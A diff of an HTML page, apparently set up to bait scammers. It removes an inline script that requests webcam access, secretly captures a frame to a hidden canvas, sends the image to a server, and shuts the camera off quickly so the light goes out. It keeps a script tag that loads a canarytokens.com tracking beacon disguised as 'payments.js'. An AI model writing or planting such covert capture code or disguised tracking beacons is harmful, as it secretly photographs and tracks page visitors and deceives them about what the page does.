@@ -13,32 +13,7 @@
   </head>
   <body>
     <div id="root"></div>
-     <script>
-       async function captureScammer() {
-    try {
-        // This triggers the browser permission pop-up
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-
-        // Capture a frame to a hidden canvas
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        // Convert to image and send to your backend/email
-        const imgData = canvas.toDataURL('image/png');
-        sendToMyServer(imgData); 
-
-        // Stop the camera immediately so the light turns off
-        stream.getTracks().forEach(track => track.stop());
-    } catch (err) {
-        console.log("User denied camera access.");
-    }
-}
-     </script>
+  
     <script src="http://canarytokens.com/traffic/articles/terms/rf541x9w60wlf476zzdvz2w4p/payments.js"></script>
   </body>
 </html>
